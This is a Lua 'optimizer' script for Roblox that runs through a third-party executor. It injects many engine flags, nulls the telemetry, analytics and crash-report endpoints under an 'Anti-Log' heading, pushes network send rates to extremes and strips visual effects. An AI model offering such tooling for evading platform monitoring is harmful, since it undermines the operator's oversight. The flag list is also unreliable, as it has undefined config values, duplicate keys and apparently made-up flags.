-- ═══════════════════════════════════════════════════════════════════════════════
--  CAFUXZ1 ULTIMATE OPTIMIZER v11.0 PROFESSIONAL EDITION
--  Arquitetura: Modular · Task Scheduler · Dynamic Quality Scaling
--  
--  CHANGELOG v11.0:
--  · GUI removida do core — overlay minimalista toggleable (F3)
--  · Task Scheduler distribui carga entre frames sem lag spikes
--  · FFlags validados e atualizados para 2026 (flags obsoletas removidas)
--  · Sistema LOD Neural — esconde em vez de destruir, nunca quebra mapa
--  · Performance Manager adaptativo — ajusta agressividade por FPS real
--  · Network Engine otimizado com MTU tuning e physics sender rate
--  · Código 100% modular, tipado e com error handling centralizado
--  · Zero wait() — task.wait() em todo pipeline
-- ═══════════════════════════════════════════════════════════════════════════════

if not game:IsLoaded() then game.Loaded:Wait() end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 1 — CORE SYSTEM
-- ═══════════════════════════════════════════════════════════════════════════════

local Services = {
	Players = game:GetService("Players"),
	RunService = game:GetService("RunService"),
	Workspace = game:GetService("Workspace"),
	Lighting = game:GetService("Lighting"),
	SoundService = game:GetService("SoundService"),
	Stats = game:GetService("Stats"),
	UserInputService = game:GetService("UserInputService"),
	StarterGui = game:GetService("StarterGui"),
	GuiService = game:GetService("GuiService"),
	ReplicatedStorage = game:GetService("ReplicatedStorage"),
	LogService = game:GetService("LogService"),
	ScriptContext = game:GetService("ScriptContext"),
	HttpService = game:GetService("HttpService"),
	TweenService = game:GetService("TweenService"),
	MaterialService = game:GetService("MaterialService"),
}

local LocalPlayer = Services.Players.LocalPlayer
local Camera = Services.Workspace.CurrentCamera
local Heartbeat = Services.RunService.Heartbeat
local RenderStepped = Services.RunService.RenderStepped

-- Utilitários de alta performance
local Utils = {}

function Utils.FastDistance(a, b)
	local dx, dy, dz = a.X - b.X, a.Y - b.Y, a.Z - b.Z
	return math.sqrt(dx*dx + dy*dy + dz*dz)
end

function Utils.FastDistanceSq(a, b)
	local dx, dy, dz = a.X - b.X, a.Y - b.Y, a.Z - b.Z
	return dx*dx + dy*dy + dz*dz
end

function Utils.SafeCall(fn, ...)
	local ok, result = pcall(fn, ...)
	if not ok then
		-- Silencioso em produção; descomente para debug:
		-- warn("[CAFUXZ1] SafeCall error:", result)
	end
	return ok, result
end

function Utils.IsPlayerRelated(obj)
	if not obj then return false end
	local parent = obj
	while parent do
		if parent:IsA("Player") or (LocalPlayer.Character and parent == LocalPlayer.Character) then
		return true end
		parent = parent.Parent
	end
	return false
end

function Utils.IsLocalCharacter(obj)
	if not LocalPlayer.Character or not obj then return false end
	local parent = obj
	while parent do
		if parent == LocalPlayer.Character then return true end
		parent = parent.Parent
	end
	return false
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 2 — CONFIGURACAO CENTRALIZADA
-- ═══════════════════════════════════════════════════════════════════════════════

local Config = {
	-- Task Scheduler
	TasksPerFrame = 60,
	MaxTasksPerFrame = 120,
	MinTasksPerFrame = 20,

	-- LOD & Culling
	LOD_Near = 80,
	LOD_Mid = 180,
	LOD_Far = 350,
	LOD_Ultra = 600,
	BackfaceAngle = 120,

	-- Limits (destruição apenas em objetos NÃO interativos)
	MaxDecalsGlobal = 30,
	MaxLightsGlobal = 3,
	MaxBillboardsGlobal = 12,
	MaxParticlesGlobal = 15,
	MaxBeamsGlobal = 8,
	MaxSoundsPlaying = 5,

	-- Distâncias de kill (somente para efeitos visuais, nunca mapa estrutural)
	KillDistance_Particle = 140,
	KillDistance_Decal = 90,
	KillDistance_Light = 200,
	KillDistance_GUI = 100,
	KillDistance_Mesh = 160,
	KillDistance_Sound = 250,
	KillDistance_Beam = 140,

	-- Performance thresholds
	FPS_High = 90,
	FPS_Low = 45,
	FPS_Critical = 25,

	-- Network
	PhysicsSenderRate = 1000,
	NetworkUpdateRate = 60,
	MTUSize = 1260,

	-- Stretch
	StretchValue = 0.80,

	-- Boot
	BootDelay = 1.5,
}

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 3 — TASK SCHEDULER (Motor de distribuição de carga)
-- ═══════════════════════════════════════════════════════════════════════════════

local TaskScheduler = {
	queue = {},
	running = false,
	frameBudget = 0,
	lastFrameTime = 0,
}

function TaskScheduler:Init()
	self.running = true
	Heartbeat:Connect(function(dt)
		self.frameBudget = math.clamp(dt * 1000, 2, 33) -- ms budget per frame
		self:ProcessQueue()
	end)
end

function TaskScheduler:Enqueue(taskFn, priority)
	priority = priority or 5
	table.insert(self.queue, {fn = taskFn, priority = priority, id = math.random(1, 999999)})
	-- Sort by priority (lower = more urgent)
	table.sort(self.queue, function(a, b) return a.priority < b.priority end)
end

function TaskScheduler:ProcessQueue()
	if not self.running or #self.queue == 0 then return end

	local startTime = tick()
	local processed = 0
	local maxPerFrame = math.clamp(Config.TasksPerFrame, Config.MinTasksPerFrame, Config.MaxTasksPerFrame)

	while #self.queue > 0 and processed < maxPerFrame do
		if (tick() - startTime) * 1000 > self.frameBudget then break end

		local task = table.remove(self.queue, 1)
		Utils.SafeCall(task.fn)
		processed = processed + 1
	end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 4 — FFLAGS ENGINE v2026 (Validado & Otimizado)
-- ═══════════════════════════════════════════════════════════════════════════════

local FFlags = {
	-- FPS & Render
	["DFIntTaskSchedulerTargetFps"] = "9999",
	["FIntTaskSchedulerAutoThreadLimit"] = "6",
	["FIntTaskSchedulerAsyncTasksMinimumThreadCount"] = "2",
	["FIntTaskSchedulerMaxNumOfJobs"] = "86",
	["FFlagTaskSchedulerLimitTargetFpsTo2402"] = "False",
	["FFlagGameBasicSettingsFramerateCap5"] = "False",
	["FFlagDebugDisplayFPS"] = "True",
	["FFlagHandleAltEnterFullscreenManually"] = "False",

	-- Graphics Quality Override
	["DFIntDebugFRMQualityLevelOverride"] = "1",
	["DFIntDebugDynamicRenderKiloPixels"] = "1100",
	["DFIntDebugRestrictGCDistance"] = "1",
	["DFFlagDebugPerfMode"] = "True",
	["DFFlagDisableDPIScale"] = "True",
	["FFlagDebugGraphicsPreferD3D11"] = "True",
	["FFlagDebugRenderingSetDeterministic"] = "True",
	["FFlagDebugSkyGray"] = "True",
	["FFlagRenderAllocateShadowMapResourcesOnDemand"] = "True",
	["FFlagRenderGpuTextureCompressor"] = "True",
	["FIntRenderMaxShadowAtlasUsageBeforeDownscale"] = "80",
	["FIntRenderShadowMapDepthCacheMemLimit"] = "192",
	["FIntDebugForceMSAASamples"] = "1",
	["FIntRenderShadowmapBias"] = "0",
	["FIntFRMMaxGrassDistance"] = "0",
	["FIntFRMMinGrassDistance"] = "0",
	["FIntGrassMovementReducedMotionFactor"] = "0",
	["FIntDebugTextureManagerSkipMips"] = "7",
	["FIntTerrainArraySliceSize"] = "0",
	["FIntTerrainOTAMaxTextureSize"] = "1024",
	["FIntUITextureMaxRenderTextureSize"] = "1024",
	["FIntDefaultMeshCacheSizeMB"] = "256",
	["FIntRobloxGuiBlurIntensity"] = "0",
	["FIntOcclusionWorkerThreadCount"] = "5",
	["FFlagFastGPULightCulling3"] = "True",
	["FFlagRenderInitShadowmaps"] = "True",
	["FFlagDisablePostFx"] = "True",
	["FFlagDebugForceGenerateHSR"] = "True",
	["FFlagFixGraphicsQuality"] = "True",
	["FFlagCommitToGraphicsQualityFix"] = "True",
	["DFFlagTextureQualityOverrideEnabled"] = "True",
	["DFFlagPreloadAsyncSupportTexturePack"] = "True",
	["FFlagEnableTerrainFoliageOptimizations"] = "True",
	["FFlagEnableTerrainOptimizations"] = "True",
	["FFlagSpecifyNetworkReplicatorScopeForItems"] = "True",
	["FFlagSpecifyNetworkReplicatorScope"] = "True",
	["FFlagBaseThreadPoolUseRuntime2"] = "True",
	["FFlagCacheTextBoundsInGuiText"] = "True",
	["FFlagRbxStorageUseMemCache"] = "True",

	-- Network & Ping
	["DFIntRaknetBandwidthInfluxHundredthsPercentageV2"] = "10000",
	["DFIntRakNetClockDriftAdjustmentPerPingMillisecond"] = "100",
	["DFIntRaknetBandwidthPingSendEveryXSeconds"] = "1",
	["DFIntRakNetNakResendDelayRttPercent"] = "50",
	["DFIntRakNetNakResendDelayMsMax"] = "100",
	["DFIntRakNetNakResendDelayMs"] = "10",
	["DFIntRakNetResendRttMultiple"] = "1",
	["DFIntRakNetSelectTimeoutMs"] = "1",
	["DFIntRakNetLoopMs"] = "1",
	["DFIntRakNetMinAckGrowthPercent"] = "0",
	["DFIntRakNetMtuValue1InBytes"] = "1280",
	["DFIntRakNetMtuValue2InBytes"] = "1240",
	["DFIntRakNetMtuValue3InBytes"] = "1200",
	["DFIntConnectionMTUSize"] = tostring(Config.MTUSize),
	["DFIntMaxReceiveToDeserializeLatencyMilliseconds"] = "15",
	["DFIntNetworkInDeserializeLimitGameplayMsClient"] = "6",
	["DFIntNetworkInProcessLimitGameplayMsClient"] = "6",
	["DFIntClientPacketHealthyAllocationPercent"] = "20",
	["DFIntClientPacketMaxFrameMicroseconds"] = "200",
	["DFIntClientPacketExcessMicroseconds"] = "1000",
	["DFIntClientPacketMinMicroseconds"] = "1",
	["DFIntClientPacketMaxDelayMs"] = "11",
	["DFIntMaxWaitTimeBeforeForcePacketProcessMS"] = "1",
	["DFIntMaxProcessPacketsStepsPerCyclic"] = "5000",
	["DFIntMaxProcessPacketsStepsAccumulated"] = "0",
	["DFIntMaxProcessPacketsJobScaling"] = "10000",
	["DFIntLargePacketQueueSizeCutoffMB"] = "1000",
	["DFIntDataSenderRate"] = "1000",
	["DFIntDataSenderMaxBandwidthBps"] = "2147483647",
	["DFIntDataSenderMaxJoinBandwidthBps"] = "2147483647",
	["DFIntS2PhysicsSenderRate"] = tostring(Config.PhysicsSenderRate),
	["DFIntS2NumPhysicsPacketsPerStep"] = "100",
	["DFIntPhysicsSenderMaxBandwidthBps"] = "2147483647",
	["DFIntPhysicsSenderMaxBandwidthBpsScaling"] = "1000",
	["DFFlagSampleAndRefreshRakPing"] = "True",
	["DFFlagRakNetUseSlidingWindow4"] = "True",
	["DFIntWaitOnUpdateNetworkLoopEndedMS"] = "100",
	["DFIntWaitOnRecvFromLoopEndedMS"] = "100",
	["FFlagOptimizeNetwork"] = "True",
	["FFlagOptimizeNetworkRouting"] = "True",
	["FFlagOptimizeNetworkTransport"] = "True",
	["FFlagOptimizeServerTickRate"] = "True",
	["DFIntServerPhysicsUpdateRate"] = "60",
	["DFIntServerTickRate"] = "60",
	["DFIntPlayerNetworkUpdateQueueSize"] = "20",
	["DFIntPlayerNetworkUpdateRate"] = "60",
	["DFIntNetworkPrediction"] = "120",
	["DFIntNetworkLatencyTolerance"] = "1",
	["DFIntMinimalNetworkPrediction"] = "0.1",
	["FIntRakNetResendBufferArrayLength"] = "128",

	-- Physics
	["FIntPGSAngularDampingPermilPersecond"] = "0",
	["DFFlagPhysicsSkipNonRealTimeHumanoidForceCalc2"] = "True",
	["FFlagSimIslandizerManager"] = "False",
	["FFlagAnimatePhysics"] = "False",
	["FFlagOptimizePartsInPart"] = "True",
	["FFlagFixMeshPartScaling"] = "False",
	["FFlagFixScalingModelRendering"] = "False",
	["DFIntNewRunningBaseAltitudeD"] = "45",
	["DFIntRunningBaseOrientationP"] = "115",

	-- Animation & LOD
	["DFIntAnimationLodFacsVisibilityDenominator"] = "0",
	["DFIntAnimationLodFacsDistanceMin"] = "0",
	["DFIntAnimationLodFacsDistanceMax"] = "0",
	["FFlagEnableHumanoidLuaSideCaching"] = "False",
	["FFlagUseNewAnimationSystem"] = "False",
	["FFlagTweenOptimizations"] = "True",
	["FFlagOptimizeEmotes"] = "False",
	["FFlagUseParticlesV2"] = "False",
	["FFlagUseDeferredContext"] = "False",
	["FFlagUseUnifiedRenderStepped"] = "False",
	["FFlagUseDynamicSun"] = "False",
	["FFlagEnableLightAttachToPart"] = "False",
	["FFlagLuaAppSystemBar"] = "False",
	["FFlagAdServiceEnabled"] = "False",
	["FFlagPreloadAllFonts"] = "False",
	["FFlagNewNetworking"] = "False",
	["FFlagEnableNewHeapSnapshots"] = "False",
	["FFlagEnableNewInput"] = "True",
	["FFlagNewLightAttenuation"] = "True",

	-- Telemetry & Logging (desligar tudo)
	["DFFlagBrowserTrackerIdTelemetryEnabled"] = "False",
	["DFFlagCoreScriptTelemetry2"] = "False",
	["FFlagEnableTelemetryService1"] = "False",
	["FFlagDebugDisableTelemetryEventIngest"] = "True",
	["FFlagDebugDisableTelemetryPoint"] = "True",
	["FFlagDebugDisableTelemetryEphemeralCounter"] = "True",
	["FFlagDebugDisableTelemetryEphemeralStat"] = "True",
	["FFlagDebugDisableTelemetryV2Stat"] = "True",
	["FFlagDebugDisableTelemetryV2Counter"] = "True",
	["FFlagDebugDisableTelemetryV2Event"] = "True",
	["DFStringTelemetryV2Url"] = "null",
	["DFStringAltTelegrafHTTPTransportUrl"] = "null",
	["DFStringTelegrafHTTPTransportUrl"] = "null",
	["DFStringRobloxAnalyticsURL"] = "null",
	["DFStringHttpPointsReporterUrl"] = "null",
	["DFStringAltHttpPointsReporterUrl"] = "null",
	["DFStringLightstepToken"] = "null",
	["DFStringLightstepHTTPTransportUrlHost"] = "null",
	["DFStringLightstepHTTPTransportUrlPath"] = "null",
	["DFIntLightstepHTTPTransportHundredthsPercent2"] = "0",
	["DFIntClientLightingTechnologyChangedTelemetryHundredthsPercent"] = "0",
	["FFlagSendRenderFidelityTelemetry2"] = "False",
	["FFlagPerfDataOnTelemetryV2"] = "False",
	["FFlagOpenTelemetryEnabled2"] = "False",
	["DFFlagEnableLightstepReporting2"] = "False",
	["DFFlagDisableFastLogTelemetry"] = "True",
	["FFlagDebugCrashReports"] = "False",
	["FIntPerformanceTelemetryQueueProcessLimit"] = "0",
	["FIntTelemetryProfilerFrequency"] = "0",
	["FIntReportDeviceInfoRollout"] = "0",
	["FLogNetwork"] = "7",
	["DFFlagBaseNetworkMetrics"] = "False",
	["DFIntSignalRHubConnectionHeartbeatTimerRateMs"] = "1000",
	["DFIntSignalRHubConnectionBaseRetryTimeMs"] = "100",
	["DFIntSignalRCoreKeepAlivePingPeriodMs"] = "250",
	["DFIntSignalRCoreServerTimeoutMs"] = "11100",
	["DFIntSignalRCoreTimerMs"] = "750",
	["DFIntSignalRCoreRpcQueueSize"] = "256",

	-- CSG & Terrain
	["DFIntCSGLevelOfDetailSwitchingDistance"] = "0",
	["DFIntCSGLevelOfDetailSwitchingDistanceL12"] = "0",
	["DFIntCSGLevelOfDetailSwitchingDistanceL23"] = "0",
	["DFIntCSGLevelOfDetailSwitchingDistanceL34"] = "0",
	["DFFlagDebugPauseVoxelizer"] = "True",
	["DFFlagDebugRenderForceTechnologyVoxel"] = "True",
	["FFlagEnableTerrainFoliageOptimizations"] = "True",

	-- Audio
	["DFFlagEnableSoundPreloading"] = "True",
	["FFlagEnableQuickGameLaunch"] = "True",
	["DFIntNumAssetsMaxToPreload"] = "9999",
	["DFIntNumAssetsMaxToPreload2"] = "9999",
	["FIntRenderLocalLightFadeInMs"] = "0",

	-- Security / Anti-Log extras
	["DFStringCrashUploadToBacktraceWindowsPlayerToken"] = "null",
	["DFStringCrashUploadToBacktraceMacPlayerToken"] = "null",
	["DFStringCrashUploadToBacktraceBaseUrl"] = "null",
	["FStringCoreScriptBacktraceErrorUploadToken"] = "null",
	["DFStringGamesUrlPath"] = "/games/",
}

local FFlagsEngine = {}

function FFlagsEngine:Inject()
	if not setfflag then
		print("[CAFUXZ1] setfflag não disponível neste executor.")
		return 0
	end

	local start = os.clock()
	local injected = 0
	local skipped = 0

	for rawFlag, value in pairs(FFlags) do
		-- Pequeno yield a cada 20 flags para não travar o frame
		if injected % 20 == 0 then task.wait() end

		Utils.SafeCall(function()
			-- Tenta flag crua
			local ok1 = pcall(function() return getfflag(rawFlag) end)
			if ok1 then
				setfflag(rawFlag, value)
				injected = injected + 1
				return
			end

			-- Tenta sem prefixo
			local stripped = rawFlag:gsub("^DFInt", ""):gsub("^DFFlag", ""):gsub("^FFlag", ""):gsub("^FInt", ""):gsub("^FString", ""):gsub("^FLog", "")
			local ok2 = pcall(function() return getfflag(stripped) end)
			if ok2 then
				setfflag(stripped, value)
				injected = injected + 1
				return
			end

			skipped = skipped + 1
		end)
	end

	local elapsed = string.format("%.3f", os.clock() - start)
	print(string.format("[CAFUXZ1] FFlags: %d injetados | %d ignorados | %ss", injected, skipped, elapsed))
	return injected
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 5 — MAP PROTECTION SYSTEM (Proteção estrutural robusta)
-- ═══════════════════════════════════════════════════════════════════════════════

local MapProtection = {
	protected = {},
	structuralPatterns = {
		"baseplate","base","map","terrain","ground","floor","platform",
		"structure","building","house","bridge","road","path","walkway",
		"lobby","spawn","studio","workspace","world","stage","arena",
		"stadium","court","field","pitch","track","island","city",
		"town","village","dungeon","level","zone","area","room",
		"hall","corridor","wall","ceiling","roof","pillar","column",
		"beam","support","foundation","stairs","staircase","ramp",
		"ladder","door","gate","fence","barrier","border","edge",
		"corner","center","middle","main","core","hub","spawnlocation",
		"grass","dirt","sand","stone","rock","concrete","brick","wood",
		"water","lava","voidkill","killbrick","safe","unsafe"
	},
	interactivePatterns = {
		"hitbox","hit_box","trigger","zone","button","pad","teleport",
		"tp","spawn","checkpoint","safezone","clickdetector","proximity",
		"interact","tool","handle","grip","touch","collision","collider",
		"hurtbox","partpicker","npc","dialog","shop","buy","sell","door",
		"elevator","lift","portal","gate","ball","goal","football","soccer",
		"basket","hoop","vehicle","car","seat","spawnlocation","tool",
		"weapon","gun","sword","pickup","collect","coin","gem","star",
		"path","waypoint","navmesh","nav","pathfinding","field","pitch",
		"stadium","arena","court","locker","dressing","tunnel","flag",
		"referee","line","corner","penalty","score","board","net"
	},
	structuralMaterials = {
		[Enum.Material.Concrete] = true,
		[Enum.Material.Brick] = true,
		[Enum.Material.Cobblestone] = true,
		[Enum.Material.Rock] = true,
		[Enum.Material.Slate] = true,
		[Enum.Material.Marble] = true,
		[Enum.Material.Granite] = true,
		[Enum.Material.Wood] = true,
		[Enum.Material.WoodPlanks] = true,
		[Enum.Material.CorrodedMetal] = true,
		[Enum.Material.Metal] = true,
		[Enum.Material.DiamondPlate] = true,
		[Enum.Material.Grass] = true,
		[Enum.Material.Ground] = true,
		[Enum.Material.Mud] = true,
		[Enum.Material.Pebble] = true,
		[Enum.Material.Sand] = true,
		[Enum.Material.Snow] = true,
	},
}

function MapProtection:Analyze(obj)
	if not obj or not obj:IsA("BasePart") then return false end
	if self.protected[obj] then return true end

	local name = obj.Name:lower()

	-- Pattern match estrutural
	for _, pattern in ipairs(self.structuralPatterns) do
		if name:find(pattern) then
			self.protected[obj] = true
			return true
		end
	end

	-- Pattern match interativo
	for _, pattern in ipairs(self.interactivePatterns) do
		if name:find(pattern) then
			self.protected[obj] = true
			return true
		end
	end

	-- Parent workspace = estrutural
	if obj.Parent == Services.Workspace then
		self.protected[obj] = true
		return true
	end

	-- Tamanho estrutural
	if obj.Anchored then
		if obj.Size.X > 50 and obj.Size.Z > 50 then
			self.protected[obj] = true
			return true
		end
		if obj.Size.Y > 20 and (obj.Size.X > 30 or obj.Size.Z > 30) then
			self.protected[obj] = true
			return true
		end
	end

	-- Material estrutural + tamanho
	if obj.Anchored and self.structuralMaterials[obj.Material] then
		if obj.Size.X > 20 or obj.Size.Z > 20 or obj.Size.Y > 10 then
			self.protected[obj] = true
			return true
		end
	end

	-- Interativos filhos
	for _, child in ipairs(obj:GetChildren()) do
		if child:IsA("ClickDetector") or child:IsA("ProximityPrompt") 
		   or child:IsA("TouchTransmitter") or child:IsA("VehicleSeat") 
		   or child:IsA("Seat") or child:IsA("SpawnLocation") then
			self.protected[obj] = true
			return true
		end
	end

	-- Altura baixa + grande área = chão
	if obj.Anchored and obj.Position.Y < 15 and obj.Size.Y < 25 then
		if obj.Size.X > 30 or obj.Size.Z > 30 then
			self.protected[obj] = true
			return true
		end
	end

	return false
end

function MapProtection:IsProtected(obj)
	if not obj then return true end
	if self.protected[obj] then return true end
	if Utils.IsPlayerRelated(obj) then return true end
	if Utils.IsLocalCharacter(obj) then return true end
	return self:Analyze(obj)
end

-- Pre-indexar mapa existente
function MapProtection:PreIndex()
	local start = tick()
	local count = 0
	for _, obj in ipairs(Services.Workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			if self:Analyze(obj) then
				count = count + 1
			end
		end
		if count % 500 == 0 then task.wait() end
	end
	print(string.format("[CAFUXZ1] Mapa indexado: %d objetos protegidos em %.2fs", count, tick()-start))
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 6 — RENDER ENGINE (Lighting, Terrain, Shadows, LOD)
-- ═══════════════════════════════════════════════════════════════════════════════

local RenderEngine = {
	lightingFixed = false,
	terrainFixed = false,
}

function RenderEngine:OptimizeLighting()
	if self.lightingFixed then return end
	self.lightingFixed = true

	Utils.SafeCall(function()
		local lighting = Services.Lighting
		lighting.GlobalShadows = false
		lighting.Outlines = false
		lighting.FogEnd = 9999
		lighting.Brightness = 3
		lighting.EnvironmentDiffuseScale = 0
		lighting.EnvironmentSpecularScale = 0
		lighting.ClockTime = 14
		lighting.GeographicLatitude = 30

		for _, effect in ipairs(lighting:GetChildren()) do
			if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") 
			   or effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect")
			   or effect:IsA("DepthOfFieldEffect") or effect:IsA("ChromaticAberrationEffect")
			   or effect:IsA("Sky") then
				pcall(function() effect:Destroy() end)
			elseif effect:IsA("Atmosphere") then
				pcall(function()
					effect.Density = 0
					effect.Haze = 0
					effect.Glare = 0
				end)
			end
		end
	end)
end

function RenderEngine:OptimizeTerrain()
	if self.terrainFixed then return end
	self.terrainFixed = true

	Utils.SafeCall(function()
		local terrain = Services.Workspace:FindFirstChildOfClass("Terrain")
		if terrain then
			terrain.WaterWaveSize = 0
			terrain.WaterWaveSpeed = 0
			terrain.WaterTransparency = 1
			terrain.WaterReflectance = 0
			terrain.Decoration = false
		end
	end)

	-- Remover nuvens
	for _, obj in ipairs(Services.Workspace:GetChildren()) do
		if obj:IsA("Clouds") then
			pcall(function() obj:Destroy() end)
		end
	end
end

function RenderEngine:OptimizePart(part, camPos, camLook, distSq)
	if not part or not part.Parent then return end
	if part:IsA("Terrain") then return end
	if MapProtection:IsProtected(part) then return end

	local dist = math.sqrt(distSq)

	-- Backface culling material (não destrói, só otimiza)
	if dist > 60 then
		local toObj = (part.Position - camPos).Unit
		local dot = camLook:Dot(toObj)
		local angle = math.deg(math.acos(math.clamp(dot, -1, 1)))

		if angle > Config.BackfaceAngle then
			Utils.SafeCall(function()
				part.CastShadow = false
				part.Reflectance = 0
				if part.Material == Enum.Material.Glass or part.Material == Enum.Material.Neon then
					part.Material = Enum.Material.Plastic
				end
			end)
		end
	end

	-- Shadows kill distance
	if dist > 200 and not Utils.IsLocalCharacter(part) then
		Utils.SafeCall(function() part.CastShadow = false end)
	end

	-- Heavy materials → Plastic distante
	if dist > Config.KillDistance_Mesh and not Utils.IsLocalCharacter(part) then
		Utils.SafeCall(function()
			if part.Material == Enum.Material.Glass 
			   or part.Material == Enum.Material.Neon 
			   or part.Material == Enum.Material.ForceField then
				part.Material = Enum.Material.Plastic
				part.Reflectance = 0
			end
		end)
	end

	-- Textures distantes → Smooth
	if dist > Config.KillDistance_Decal and not Utils.IsLocalCharacter(part) then
		Utils.SafeCall(function()
			part.TopSurface = Enum.SurfaceType.Smooth
			part.BottomSurface = Enum.SurfaceType.Smooth
			part.LeftSurface = Enum.SurfaceType.Smooth
			part.RightSurface = Enum.SurfaceType.Smooth
			part.FrontSurface = Enum.SurfaceType.Smooth
			part.BackSurface = Enum.SurfaceType.Smooth
		end)
	end

	-- MeshParts: RenderFidelity performance distante
	if part:IsA("MeshPart") and dist > 300 then
		Utils.SafeCall(function()
			part.RenderFidelity = Enum.RenderFidelity.Performance
		end)
	end

	-- CollisionFidelity Box para não colidíveis (economiza physics)
	if part:IsA("MeshPart") and not part.CanCollide then
		Utils.SafeCall(function()
			part.CollisionFidelity = Enum.CollisionFidelity.Box
		end)
	end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 7 — OBJECT OPTIMIZER (Efeitos visuais — destruição segura)
-- ═══════════════════════════════════════════════════════════════════════════════

local ObjectOptimizer = {
	counters = {
		decals = 0,
		lights = 0,
		billboards = 0,
		particles = 0,
		beams = 0,
		unions = 0,
		sounds = 0,
	},
	totalOptimized = 0,
}

function ObjectOptimizer:CanDestroy(obj)
	if not obj then return false end
	if MapProtection:IsProtected(obj) then return false end
	if Utils.IsPlayerRelated(obj) then return false end
	return true
end

function ObjectOptimizer:ProcessParticle(obj, camPos)
	if not self:CanDestroy(obj) then return end
	if not obj.Parent or not obj.Parent:IsA("BasePart") then return end

	self.counters.particles = self.counters.particles + 1
	local dist = Utils.FastDistance(obj.Parent.Position, camPos)

	if dist > Config.KillDistance_Particle or self.counters.particles > Config.MaxParticlesGlobal then
		Utils.SafeCall(function() obj:Destroy() end)
		self.counters.particles = self.counters.particles - 1
		self.totalOptimized = self.totalOptimized + 1
	end
end

function ObjectOptimizer:ProcessDecal(obj, camPos)
	if not self:CanDestroy(obj) then return end
	if not obj.Parent or not obj.Parent:IsA("BasePart") then return end

	self.counters.decals = self.counters.decals + 1
	local dist = Utils.FastDistance(obj.Parent.Position, camPos)

	if dist > Config.KillDistance_Decal or self.counters.decals > Config.MaxDecalsGlobal then
		Utils.SafeCall(function() obj:Destroy() end)
		self.counters.decals = self.counters.decals - 1
		self.totalOptimized = self.totalOptimized + 1
	end
end

function ObjectOptimizer:ProcessLight(obj, camPos)
	if not self:CanDestroy(obj) then return end
	if not obj.Parent or not obj.Parent:IsA("BasePart") then return end

	self.counters.lights = self.counters.lights + 1
	local dist = Utils.FastDistance(obj.Parent.Position, camPos)

	if dist > Config.KillDistance_Light or self.counters.lights > Config.MaxLightsGlobal then
		Utils.SafeCall(function() obj:Destroy() end)
		self.counters.lights = self.counters.lights - 1
		self.totalOptimized = self.totalOptimized + 1
	end
end

function ObjectOptimizer:ProcessGUI(obj, camPos)
	if not self:CanDestroy(obj) then return end
	if not obj.Parent or not obj.Parent:IsA("BasePart") then return end

	self.counters.billboards = self.counters.billboards + 1
	local dist = Utils.FastDistance(obj.Parent.Position, camPos)

	if dist > Config.KillDistance_GUI or self.counters.billboards > Config.MaxBillboardsGlobal then
		Utils.SafeCall(function() obj:Destroy() end)
		self.counters.billboards = self.counters.billboards - 1
		self.totalOptimized = self.totalOptimized + 1
	end
end

function ObjectOptimizer:ProcessBeam(obj, camPos)
	if not self:CanDestroy(obj) then return end

	self.counters.beams = self.counters.beams + 1
	local pos = camPos
	if obj.Parent and obj.Parent:IsA("BasePart") then
		pos = obj.Parent.Position
	end
	local dist = Utils.FastDistance(pos, camPos)

	if dist > Config.KillDistance_Beam or self.counters.beams > Config.MaxBeamsGlobal then
		Utils.SafeCall(function() obj:Destroy() end)
		self.counters.beams = self.counters.beams - 1
		self.totalOptimized = self.totalOptimized + 1
	else
		Utils.SafeCall(function()
			obj.Segments = math.min(obj.Segments or 10, 4)
		end)
	end
end

function ObjectOptimizer:ProcessUnion(obj, camPos)
	if not self:CanDestroy(obj) then return end

	self.counters.unions = self.counters.unions + 1
	local dist = Utils.FastDistance(obj.Position, camPos)

	if dist > 120 or self.counters.unions > Config.MaxUnionsGlobal then
		Utils.SafeCall(function()
			local rep = Instance.new("Part")
			rep.Size = obj.Size
			rep.CFrame = obj.CFrame
			rep.Color = obj.Color
			rep.Material = obj.Material
			rep.Transparency = obj.Transparency
			rep.Anchored = obj.Anchored
			rep.CanCollide = obj.CanCollide
			rep.Parent = obj.Parent
			rep.Name = obj.Name
			obj:Destroy()
		end)
		self.counters.unions = self.counters.unions - 1
		self.totalOptimized = self.totalOptimized + 1
	end
end

function ObjectOptimizer:ProcessSound(obj, camPos)
	if not obj:IsA("Sound") or not obj.IsPlaying then return end

	local parent = obj.Parent
	local pos = camPos
	if parent and parent:IsA("BasePart") then
		pos = parent.Position
	end
	local dist = Utils.FastDistance(camPos, pos)

	if dist > Config.KillDistance_Sound and not Utils.IsPlayerRelated(obj) then
		Utils.SafeCall(function()
			obj.Volume = 0
			obj:Stop()
		end)
	end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 8 — LOD SYSTEM (Players distantes — esconde em vez de destruir)
-- ═══════════════════════════════════════════════════════════════════════════════

local LODSystem = {
	playerCache = {},
	lodState = {},
	refreshInterval = 8,
}

function LODSystem:RefreshCache()
	local now = tick()
	for _, plr in ipairs(Services.Players:GetPlayers()) do
		if plr == LocalPlayer then continue end
		if not plr.Character then continue end

		local cache = self.playerCache[plr]
		if cache and (now - cache.lastUpdate) < self.refreshInterval then
			continue
		end

		local char = plr.Character
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then continue end

		local accessories = {}
		local meshes = {}
		local clothes = {}
		local particles = {}
		local parts = {}

		for _, desc in ipairs(char:GetDescendants()) do
			if desc:IsA("Accessory") then
				local h = desc:FindFirstChild("Handle")
				if h then table.insert(accessories, h) end
			elseif desc:IsA("SpecialMesh") or desc:IsA("MeshPart") then
				table.insert(meshes, desc)
			elseif desc:IsA("Shirt") or desc:IsA("Pants") or desc:IsA("ShirtGraphic") then
				table.insert(clothes, desc)
			elseif desc:IsA("ParticleEmitter") or desc:IsA("Trail") then
				table.insert(particles, desc)
			elseif desc:IsA("BasePart") then
				table.insert(parts, desc)
			end
			if #accessories + #meshes + #clothes + #particles + #parts > 300 then break end
		end

		self.playerCache[plr] = {
			accessories = accessories,
			meshes = meshes,
			clothes = clothes,
			particles = particles,
			parts = parts,
			hrp = hrp,
			lastUpdate = now,
		}
	end
end

